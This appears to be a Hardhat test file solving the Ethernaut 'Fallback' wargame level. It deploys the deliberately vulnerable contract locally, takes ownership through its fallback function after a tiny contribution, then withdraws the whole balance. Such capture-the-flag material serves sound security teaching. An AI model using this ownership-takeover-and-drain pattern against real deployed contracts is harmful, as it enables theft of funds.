const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();
        const Level1 = await hre.ethers.getContractFactory("Fallback");
        const level1 = await Level1.deploy();
      
        await level1.deployed();
      
        console.log(
          `Level1 deployed at address ${level1.address}`
        );

        return {level1, owner, otherAccount};
    }

    /*
    You will beat this level if

    1) you claim ownership of the contract
    2) you reduce its balance to 0
    */
    describe("Solve", function() {
        it("Should solve level1", async function() {
            const {level1, owner, otherAccount} = await loadFixture(deployFallback);
            // call contribute() and ensure our contribution is updated
            await level1.connect(otherAccount).contribute({value: ethers.utils.parseEther(".0001")});
            const contribution = await level1.connect(otherAccount).getContribution()
            expect(contribution).equals(ethers.utils.parseEther(".0001"));

            // send a transaction with some eth which should make us the owner
            tx = { 
                to: level1.address,
                value: ethers.utils.parseEther(".01")
            }
            await otherAccount.sendTransaction(tx);
            const new_owner = await level1.owner();
            expect(new_owner).equals(otherAccount.address)

            // withdraw the balance and ensure the balance is 0
            await level1.connect(otherAccount).withdraw();
            balance = await ethers.provider.getBalance(level1.address)
            expect(balance).equals(0);
        })
    });
});